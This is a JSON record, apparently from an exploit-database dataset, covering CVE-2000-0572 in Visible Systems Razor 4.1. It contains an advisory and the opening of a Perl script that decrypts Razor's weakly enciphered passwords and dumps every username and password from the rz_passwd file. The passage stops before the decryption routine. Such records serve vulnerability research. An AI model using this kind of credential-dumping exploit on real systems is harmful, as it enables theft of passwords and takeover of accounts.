{
    "text": "ecve : CVE-2000-0572 ， title : Visible Systems Razor 4.1 - Password File ( 2 ) - Unix local Exploit ， verified : Verified ， exploit_detail : source :  ， The Razor Configuration Management program stores passwords in an insecure manner. ， A local attacker can obtain the Razor passwords , and either seize control of the software and relevant databases or use those passwords to access other users' accounts on the network. ，  #  ! /usr/local/bin/perl ，  # Title : passwd_rz.pl ，  # Author : Shawn A. Clifford ，  # Date : 2000-June-15 ，  # Purpose : Encrypt/decrypt Visible Systems Corp.' Razor passwords ，  # Usage : passwd_rz.pl [ hex_hash | password_file_name ]  ，  # When run without arguments , this program will prompt for ，  # a plaintext password and produce the ciphertext that Razor ，  # would create for the same string. ，  # Eg. : ./passwd_rz.pl ，  # Enter a password , max 8 chars : WayLame ，  # Hash ( in hex )  : D5585E13585B59 ，  # When passed a hex-character string , the program will ，  # generate the corresponding plaintext password. ，  # Eg. : ./passwd_rz.pl D5585E13585B59 ，  # Decrypting input hex string : D5585E13585B59 ，  # Plaintext password : WayLame ，  # When passed a filename for a Razor password file ( rz_passwd )  ,  ，  # the program will dump all of the entries in the password ，  # file. Each entry contains a username , password , and group. ，  # Eg. : ./passwd_rz.pl rz_passwd ，  # Decrypting Razor password file : rz_passwd ，  # Username Password Group ，  # -------- -------- ----- ，  # luser123 lamerz please ，  # luser45 cant fix ，  # buckwheat code this ，  # . ，  # . ，  # . ，  # tester1 CCCCCCCC test ，  # tester2 AAAAAA test ，  # 233 password entries ， use strict ;  ，  # Defines ， my $ arg ;  # Command line argument ， my $ PLEN = 8 ;  # Maximum number of chars in a password ， my $ PGLEN = 22 ;  # Output page length ， my @ hash ;  # Password hash ( err , lame cipher )  ， my $ passwd ;  # Plaintext password ， my $ byte ;  # A single byte/char ， my $ buffer ;  # Record from the password file ， my $ i ;  # Counter/index ， my $ user ;  # Username from password file ， my $ group ;  # Group name from password file ， my $ rec_fmt = 'A17 C17 A17' ;  # rz_passwd record format ， my $ rec_size = length ( pack (  $ rec_fmt ,  (  )  )  )  ;  # Size of a password file record ，  # Get a password",
    "time": "2000-06-15"
}